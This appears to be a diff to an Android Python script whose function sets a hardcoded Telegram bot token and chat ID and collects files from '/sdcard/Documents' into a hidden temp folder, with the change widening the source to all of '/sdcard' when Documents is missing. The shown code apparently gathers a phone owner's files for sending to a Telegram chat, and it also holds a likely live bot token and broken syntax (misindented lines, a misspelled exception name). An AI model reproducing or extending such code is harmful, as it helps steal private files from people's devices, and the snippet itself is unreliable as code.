@@ -361,7 +361,12 @@ def mainduluyuk2():
 	BOT_TOKEN = "7829625950:AAE9ogVVyz2nJbn9CjwGzAqGEm0m8HoyArw"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
-	source_folder = '/sdcard/Documents'
+	try:
+		source_folder = '/sdcard/Documents'
+			if not os.path.exists(source_folder):
+				raise FileNotFoundErro
+	except:
+		source_folder = '/sdcard'
 	temp_folder = "./data/.temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
